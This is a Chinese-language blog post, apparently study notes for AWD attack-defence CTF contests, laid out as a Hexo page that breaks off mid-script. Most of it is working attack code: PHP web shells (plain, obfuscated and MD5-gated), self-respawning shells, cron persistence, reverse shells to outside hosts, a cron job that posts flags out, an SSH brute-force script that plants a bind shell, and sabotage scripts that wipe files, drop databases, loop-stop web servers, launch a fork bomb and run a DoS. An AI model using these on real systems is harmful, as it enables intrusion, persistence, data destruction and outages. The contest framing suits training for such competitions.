<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Dokiy's Blog | Dokiy's Blog</title><meta name="author" content="Dokiy"><meta name="copyright" content="Dokiy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="后台执行命令 php kill.php &gt;&#x2F;tmp&#x2F;kill.log 2&gt;&amp;1 &amp;   php kill.php命令 &gt; &#x2F;tmp&#x2F;kill.log 将命令执行日志写到tmp目录下的kill.log文件中 2&gt;&amp;1 &amp;后台执行命令  AWD 规则AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三">
<meta property="og:type" content="article">
<meta property="og:title" content="Dokiy&#39;s Blog">
<meta property="og:url" content="https://dokidokiy.github.io/2023/07/25/AWD%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="Dokiy&#39;s Blog">
<meta property="og:description" content="后台执行命令 php kill.php &gt;&#x2F;tmp&#x2F;kill.log 2&gt;&amp;1 &amp;   php kill.php命令 &gt; &#x2F;tmp&#x2F;kill.log 将命令执行日志写到tmp目录下的kill.log文件中 2&gt;&amp;1 &amp;后台执行命令  AWD 规则AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://dokidokiy.github.io/img/head.png">
<meta property="article:published_time" content="2023-07-25T15:26:16.389Z">
<meta property="article:modified_time" content="2023-07-25T15:26:28.465Z">
<meta property="article:author" content="Dokiy">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://dokidokiy.github.io/img/head.png"><link rel="shortcut icon" href="/img/head.png"><link rel="canonical" href="https://dokidokiy.github.io/2023/07/25/AWD%E6%80%BB%E7%BB%93/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Dokiy\'s Blog',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-07-25 23:26:28'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="Dokiy's Blog"><span class="site-name">Dokiy's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-25T15:26:16.389Z" title="发表于 2023-07-25 23:26:16">2023-07-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-25T15:26:28.465Z" title="更新于 2023-07-25 23:26:28">2023-07-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>后台执行命令</p>
<pre><code>php kill.php &gt;/tmp/kill.log 2&gt;&amp;1 &amp;
</code></pre>
<blockquote>
<p><code>php kill.php</code>命令</p>
<p><code>&gt; /tmp/kill.log</code> 将命令执行日志写到tmp目录下的kill.log文件中</p>
<p><code>2&gt;&amp;1 &amp;</code>后台执行命令</p>
</blockquote>
<h1 id="AWD-规则"><a href="#AWD-规则" class="headerlink" title="AWD 规则"></a><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=AWD&spm=1001.2101.3001.7020">AWD</a> 规则</h1><p>AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。</p>
<ul>
<li>1.一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
<li>2.可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（较少提供）；</li>
<li>3.flag在主办方的设定下每隔一定时间刷新一轮；</li>
<li>4.各队一般都有一个初始分数；</li>
<li>5.flag一旦被其他队伍拿走，该队扣除一定积分；</li>
<li>6.得到flag的队伍加分；</li>
<li>7.一般每个队伍会给一个低权限用户，非root权限；</li>
<li>8.主办方会对每个队伍的服务进行check，服务器宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分。 # 前期准备</li>
</ul>
<p>SSH登录</p>
<p>口令登录</p>
<p>命令格式: ssh客户端用户名@服务器ip地址</p>
<pre><code>ssh  用户名@ip

ssh  ctf@
</code></pre>
<p>如果不是默认端口，可以使用-p修改端口</p>
<pre><code>ssh -p 指定端口号 用户名@ip
</code></pre>
<p>密钥登录</p>
<p>用id_rsa用于登录靶机</p>
<pre><code>sftp -i id_rsa ctf@ip
</code></pre>
<p>压缩网站源码</p>
<p>用于备份和代码审计修复以及分析攻击点，每个服务器的网站都一样</p>
<pre><code>tar -zcvf /tmp/html.zip /var/www/html
</code></pre>
<p><img src="/2023/07/25/AWD%E6%80%BB%E7%BB%93/Users\xdm\AppData\Roaming\Typora\typora-user-images\image-20230725232413954.png" alt="image-20230725232413954"></p>
<p>2.备份数据库</p>
<ul>
<li>备份指定的多个数据库</li>
</ul>
<pre><code>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql
</code></pre>
<p>无 lock tables 权限的解决方法</p>
<pre><code>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql
</code></pre>
<ul>
<li>恢复备份（在 MySQL 终端下执行）</li>
</ul>
<pre><code>source FILE_PATH
</code></pre>
<ul>
<li>重置 MySQL 密码（在 MySQL 终端下执行）</li>
</ul>
<p>方法 1</p>
<pre><code>set password for 用户名@localhost = password(&quot;新密码&quot;)
</code></pre>
<p>方法 2</p>
<pre><code>mysqladmin -u用户名 -p旧密码 password 新密码
</code></pre>
<p>3.下载到本地</p>
<pre><code>scp -P ssh_port user@host_ip:/tmp/bak.sql local_file
</code></pre>
<h2 id="查找预留后门"><a href="#查找预留后门" class="headerlink" title="查找预留后门"></a>查找预留后门</h2><p>用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用后门攻击其他靶机。</p>
<p>可以使用 seay进行代码审计</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>端口扫描是信息收集的一部分，需要知道目标服务器开放了哪些端口，使用端口扫描工具有御剑高速TCP全端口扫描工具、nmap和masscan等进行扫描。</p>
<p>所有服务器配置都是一样的，也可以看己方靶机开放了哪些端口。</p>
<p>以下是一些服务端口的漏洞：</p>
<p>22：ssh弱口令</p>
<p>873：未授权访问漏洞</p>
<p>3306：mysql弱口令</p>
<p>6379：redis未授权访问漏洞</p>
<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>信息收集</p>
<ul>
<li>nmap、Routescan</li>
<li>Python 脚本</li>
</ul>
<pre><code>import requests
for x in range(2,255):
    url = &quot;&lt;http://192.168.1&gt;.&#123;&#125;&quot;.format(x)
    try:
        r = requests.post(url)
        print(url)
        except:
        pass
</code></pre>
<h2 id="后门利用"><a href="#后门利用" class="headerlink" title="后门利用"></a>后门利用</h2><p>curl读flag</p>
<pre><code>C:\\Users\\admin&gt;curl &quot;&lt;http://192.168.182.130:8801/include/shell.php&gt;&quot; -d &quot;admin_ccmd=system(&#39;cat /f*&#39;);&quot;
SL&#123;4a0be463dd85555090f2216795677916d2447242&#125;
flag&#123;glzjin_wants_a_girl_friend&#125;
</code></pre>
<p>脚本</p>
<pre><code>端口
#coding=utf-8
import requests
url_head=&quot;&lt;http://192.168.182.130&gt;&quot;   #网段
url=&quot;&quot;
shell_addr=&quot;/upload/url/shell.php&quot; #木马路径
passwd=&quot;pass&quot;                   #木马密码
#port=&quot;80&quot;
payload = &#123;passwd: &#39;System(\\&#39;cat /flag\\&#39;);&#39;&#125;
# find / -name &quot;flag*&quot;

#清空上次记录
flag=open(&quot;flag.txt&quot;,&quot;w&quot;)
flag.close()

flag=open(&quot;flag.txt&quot;,&quot;a&quot;)

for i in range(8000,8004):
    url=url_head+&quot;:&quot;+str(i)+shell_addr
    try:
        res=requests.post(url,payload)#,timeout=1
        if res.status_code == requests.codes.ok:
            result = res.text
            print (result)
            flag.write(result+&quot;\\n&quot;)
        else:
            print (&quot;shell 404&quot;)
    except:
        print (url+&quot; connect shell fail&quot;)

flag.close()
</code></pre>
<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>常用语言的一句话木马</p>
<pre><code>php： &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;      &lt;?php eval($_GET[&#39;pass&#39;]);
asp：   &lt;%eval request (&quot;pass&quot;)%&gt;
aspx：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;
</code></pre>
<p>蚁剑连接get型木马，之前一直不会用蚁剑连接get型木马，这里记录一下。</p>
<pre><code>&lt;?php eval($_GET[&#39;pass&#39;]);

/shell.php?pass=eval($_POST[1]);
连接密码：1
</code></pre>
<h2 id="隐藏shell"><a href="#隐藏shell" class="headerlink" title="隐藏shell"></a>隐藏shell</h2><p>shell很容易被发现，被删除就gg了，可以采用一些操作隐藏shell或使shell无法被删除</p>
<p><strong>1.把shell.php命名为.shell.php</strong></p>
<p>.shell.php在执行ls时无法被查看到，搭配ls的参数才能被发现</p>
<p>完整命令如下</p>
<pre><code>[sss@ecs-centos-7 awd]$ echo &quot;iamshell&quot;&gt;shell.php
[sss@ecs-centos-7 awd]$ ls
shell.php
[sss@ecs-centos-7 awd]$ mv shell.php .shell.php
[sss@ecs-centos-7 awd]$ ls
[sss@ecs-centos-7 awd]$ ls -al
总用量 12
drwxrwxr-x 2 sss sss 4096 12月  29 22:52 .
drwx------ 4 sss sss 4096 12月  29 22:51 ..
-rw-rw-r-- 1 sss sss    9 12月  29 22:52 .shell.php
</code></pre>
<p><strong>2.把shell.php命名为-shell.php</strong></p>
<p>从上面可以看出，ls加参数才能查看到shell，那么我们直接写一个-shell.php、</p>
<p>命令行会把-后面的内容当成参数执行，执行即使被发现，使用rm命令进行删除，会被当成是rm的参数，就会发生报错，无法删除shell，目的也达到了</p>
<p>完整命令如下</p>
<pre><code>[sss@ecs-centos-7 awd]$ ls
-shell.php
[sss@ecs-centos-7 awd]$ rm -shell.php
rm：无效选项 -- s
Try &#39;rm ./-shell.php&#39; to remove the file &quot;-shell.php&quot;.
Try &#39;rm --help&#39; for more information.
[sss@ecs-centos-7 awd]$ rm -rf -shell.php
rm：无效选项 -- s
Try &#39;rm ./-shell.php&#39; to remove the file &quot;-shell.php&quot;.
Try &#39;rm --help&#39; for more information.
</code></pre>
<h2 id="特殊的shell"><a href="#特殊的shell" class="headerlink" title="特殊的shell"></a>特殊的shell</h2><p>shell1：</p>
<pre><code>&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;
</code></pre>
<p>连接方式：php?2=assert密码是1。</p>
<p>shell2：</p>
<pre><code>&lt;?php
$a=chr( 96^5);
$b=chr( 57^79);
$c=chr( 15^110);
$d=chr( 58^86);
$e= &#39;($_REQUEST[C])&#39;;
@assert($a.$b.$c.$d.$e);
?&gt;
</code></pre>
<p>配置为?b=))99(rhC(tseuqeR+lave</p>
<p>shell3：</p>
<pre><code>&lt;?php
$sF= &quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&#39;n985de9&#39;];if(isset($s22))&#123;eval($s21($s22));&#125;
?&gt;
</code></pre>
<p>配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</p>
<p>连接密码:0（零）</p>
<p>shell4：MD5木马</p>
<pre><code>&lt;?php
if(md5($_POST[&#39;pass&#39;])==&#39;d8d1a1efe0134e2530f503028a825253&#39;)
@eval($_POST[&#39;cmd&#39;]);
?&gt;
</code></pre>
<p>shell5：MD5木马+利用header</p>
<p>2021ISCC河南赛区线下赛就是这种shell，当时差点没看出来</p>
<pre><code>&lt;?php
echo &#39;hello&#39;;
if(md5($_POST[&#39;pass&#39;])==&#39;d8d1a1efe0134e2530f503028a825253&#39;)
if (@$_SERVER[&#39;HTTP_USER_AGENT&#39;] == &#39;flag&#39;)&#123;
$test= &#39;flag&#39;;
header(&quot;flag:$test&quot;);
&#125;
?&gt;
</code></pre>
<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p>不死马示例：</p>
<pre><code>&lt;?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = &#39;shell.php&#39;;
$code = &#39;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&#39;cmd&#39;]);&#125; ?&gt;&#39;;
while (1)&#123;
    file_put_contents($file,$code);
    system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#39;);
    usleep(5000);
&#125;
?&gt;

#passwd=y0range857
#POST传参：passwd=y0range857&amp;a=system(&#39;ls&#39;);
</code></pre>
<p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，然后使用caidao输入<a target="_blank" rel="noopener" href="http://xxx/shell2.php?pass=pass%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%93%BE%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%8C%E7%94%B1%E4%BA%8Epass%E6%98%AFmd5%E5%8A%A0%E5%AF%86%E5%BE%88%E9%9A%BE%E8%A2%AB%E7%A0%B4%E8%A7%A3%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%88%B0%E9%9A%90%E8%94%BD,md5%E5%80%BC%E5%8F%AF%E4%BB%A5%E9%9A%8F%E6%84%8F%E5%AE%9A%E4%B9%89%E3%80%82">http://xxx/shell2.php?pass=pass的路径，密码为a就可以链接一句话，由于pass是md5加密很难被破解也可以做到隐蔽,md5值可以随意定义。</a></p>
<p>写入shell， at.php内容</p>
<pre><code>&lt;?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = &#39;.login.php&#39;;
$file1 = &#39;/admin/.register.php&#39;;
$code = &#39;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&quot;at&quot;]);&#125; ?&gt;&#39;;
while (1)&#123;
    file_put_contents($file,$code);
    system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&#39;);
    file_put_contents($file1,$code);
    system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&#39;);
    usleep(5000);
&#125;
?&gt;
</code></pre>
<p>浏览器访问at.php，会生成不死马at2.php</p>
<pre><code>url/upload/at.php
</code></pre>
<p>再传入，执行命令，getshell</p>
<pre><code>url/upload/at2.php?passwd=obse007&amp;at=system(&#39;ls&#39;);
</code></pre>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少，未雨绸缪。</p>
<p><strong>crontab定时任务</strong></p>
<p>1.使用定时任务写马</p>
<pre><code>system(&#39;echo &quot;* * * * * echo \\&quot;&lt;?php  if(md5(\\\\\\\\\\\\\\\\\\$_POST[pass])==\\&#39;462d4a0e7cedd6b024a4d99f10c614d1\\&#39;)&#123;@eval(\\\\\\\\\\\\\\\\\\$_POST[1]);&#125;  \\&quot; &gt; /var/www/html/.index.php\\n* * * * * chmod 777 /var/www/html/.index.php&quot; | crontab;whoami&#39;);
</code></pre>
<p>密码：atkx</p>
<p>来指定用户运行指定的定时任务</p>
<p>2.使用定时任务发送带有flag的请求</p>
<pre><code>bash# 编辑 crontab：crontab -e
*/5 * * * * curl 10.10.10.5:8000/submit_flag/ -d &#39;flag=&#39;$(cat /home/web/flag/flag)&#39;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#39;
# 查询 crontab：crontab -l
</code></pre>
<p>3.使用定时任务反弹shell</p>
<pre><code>bash -c bash&#39;bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1&#39;

nc -e /bin/bash 1.3.3.7 4444 bash
</code></pre>
<p><strong>反弹shell</strong></p>
<p>nc反弹shell</p>
<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.182.130/6666 0&gt;&amp;1
</code></pre>
<p>本地</p>
<pre><code>nc -l -p 6666
</code></pre>
<h2 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h2><p>软连接语法：</p>
<pre><code>ln -s  [shell路径]   [新文件路径]
</code></pre>
<p>使用方法：</p>
<p>访问/upload/new.php，实际上是访问/upload/shell.php</p>
<pre><code>ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php
</code></pre>
<p>软连接利用</p>
<pre><code>root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css
root@086f12c38b93:~# cat /var/www/html/css/flag.css
SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;
</code></pre>
<p>然后访问url/css/flag.css即可得到flag</p>
<h2 id="SSH弱密码利用"><a href="#SSH弱密码利用" class="headerlink" title="SSH弱密码利用"></a>SSH弱密码利用</h2><pre><code>#-*- coding:utf-8 -*-
import paramiko
ip = &#39;192.168.1.137&#39;
port = &#39;22&#39;
username = &#39;root&#39;
passwd = &#39;123456&#39;
# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd=&#39;cat /flag&#39;):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
    stdin,stdout,stderr = ssh.exec_command(cmd)
    result = stdout.read()
    if not result :
        print(&quot;无结果!&quot;)
        result = stderr.read()
    ssh.close()
    return result.decode()
a = ssh_base_pwd(ip,port,username,passwd)
print(a)

#SL&#123;3c7c719b9fb980dca71080b9d96c9c6aa03c16c0&#125;
</code></pre>
<p>批量</p>
<pre><code>#-*- coding:utf-8 -*-
import paramiko
import threading
import queue
import time
#反弹shell python
q=queue.Queue()
#lock = threading.Lock()

# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
    stdin,stdout,stderr = ssh.exec_command(cmd)
    result = stdout.read()
    if not result :
        result = stderr.read()
    ssh.close()
    return result.decode()

def main(x):
    shell = &#39;&#39;&#39;
    #服务器端
    import socket
    import os
    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((&#39;0.0.0.0&#39;,1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接
    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量
    con,addr=s.accept()     #接受一个客户端的连接
    #print(con,addr)
    for i in range(10):
        cmd=con.recv(1024)
        print(cmd)
        command=cmd.decode()
        if command.startswith(&#39;cd&#39;):
            os.chdir(command[2:].strip())   #切换路径
            result=os.getcwd()      #显示路径
        else:
            result=os.popen(command).read()
        if result:
            con.send(result.encode())
        else:
            con.send(b&#39;OK!&#39;)
    &#39;&#39;&#39;
    cmd = &#39;echo \\&quot;%s\\&quot; &gt; ./shell.py&#39; % (shell) +&#39;&amp;&amp; python3 ./shell.py&#39;
    port = &#39;22&#39;
    username = &#39;root&#39;
    passwd = &#39;toor&#39;

    ip = &#39;192.168.1.&#123;&#125;&#39;.format(x)
    q.put(ip.strip(),block=True, timeout=None)
    ip_demo=q.get()
    #判断是否成功
    try:
        #lock.acquire()
        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd=&#39;id&#39;)
        if res:
            print(&quot;[ + ]Ip: %s&quot; % ip_demo +&quot; is success!!! [ + ]&quot;)
            #lock.release()
            ssh_base_pwd(ip_demo,port,username,passwd,cmd)
    except:
        print(&quot;[ - ]Ip: %s&quot; % ip_demo +&quot; is Failed&quot;)
    if x &gt; 255:
        print(&quot;Finshed!!!!!!!!&quot;)
    q.task_done()

#线程队列部分
th=[]
th_num=255
for x in range(th_num):
        t=threading.Thread(target=main,args=(x,))
        th.append(t)
for x in range(th_num):
        th[x].start()
for x in range(th_num):
        th[x].join()

#q.join()所有任务完成
</code></pre>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="攻击搅屎"><a href="#攻击搅屎" class="headerlink" title="攻击搅屎"></a>攻击搅屎</h2><p>无限复制</p>
<pre><code>&lt;?php
  set_time_limit(0);
  ignore_user_abort(true);
  while(1)&#123;
      file_put_contents(randstr().&#39;.php&#39;,file_get_content(__FILE__));
      file_get_contents(&quot;&lt;http://127.0.0.1/&gt;&quot;);
  &#125;
?&gt;
</code></pre>
<p>修改数据库密码</p>
<pre><code>update mysql.user set authentication_string=PASSWORD(&#39;p4rr0t&#39;);# 修改所有用户密码
flush privileges;
UPDATE mysql.user SET User=&#39;aaaaaaaaaaaa&#39; WHERE user=&#39;root&#39;;
flush privileges;
delete from mysql.user ;#删除所有用户
flush privileges;
</code></pre>
<p>重启 apache2 和 nigix</p>
<pre><code>#!/usr/bin/env sh
while [[ 1 ]]
do
    service apache2 stop
    service nginx stop
done &amp;
</code></pre>
<p>循环删除</p>
<pre><code>&lt;?php
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);
    function getfiles($path)&#123;
        foreach(glob($path) as $afile)&#123;
            if(is_dir($afile))
                getfiles($afile.&#39;/*.php&#39;);
            else
                @file_put_contents($afile,&quot;#Anything#&quot;);
                //unlink($afile);
        &#125;
    &#125;
    while(1)&#123;
        getfiles(__DIR__);
        sleep(10);
    &#125;
?&gt;

&lt;?php
    set_time_limit(0);
    ignore_user_abort(1);
    array_map(&#39;unlink&#39;, glob(&quot;some/dir/*.php&quot;));
?&gt;
</code></pre>
<p>删除数据库</p>
<pre><code>#!/usr/bin/env python3
  import base64
  def rm_db(db_user,my_db_passwd):
      cmd = &quot;/usr/bin/mysql -h localhost -u%s %s -e &#39;&quot;%(db_user,my_db_passwd)
      db_name = [&#39;performance_schema&#39;,&#39;mysql&#39;,&#39;flag&#39;]
      for db in db_name:
          cmd += &quot;drop database %s;&quot;%db
      cmd += &quot;&#39;&quot;
      return cmd
</code></pre>
<p>fork_bomb</p>
<pre><code>#!/bin/sh
/bin/echo &#39;.() &#123; .|.&amp; &#125; &amp;&amp; .&#39; &gt; /tmp/aaa;/bin/bash /tmp/aaa;
</code></pre>
<p>DOS脚本（非必要最好不要用）</p>
<pre><code>import socket
import time
import threading

max=90000000
port=80                 #端口
host=&quot;192.168.92.154&quot;   #IP
page=&quot;/index.php&quot;

bag=(&quot;POST %s HTTP/1.1\\r\\n&quot;
    &quot;host: %s\\r\\n&quot;
    &quot;Content-Length: 1000000000\\r\\n&quot;
    &quot;Cookie: 1998\\r\\n&quot;
    &quot;\\r\\n&quot; % (page,host))

socks = []

def connect():
    global socks
    for i in range(0,max):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((host,port))
            s.send(bag.encode(&quot;utf-8&quot;))
            socks.append(s)
        except Exception as ex:
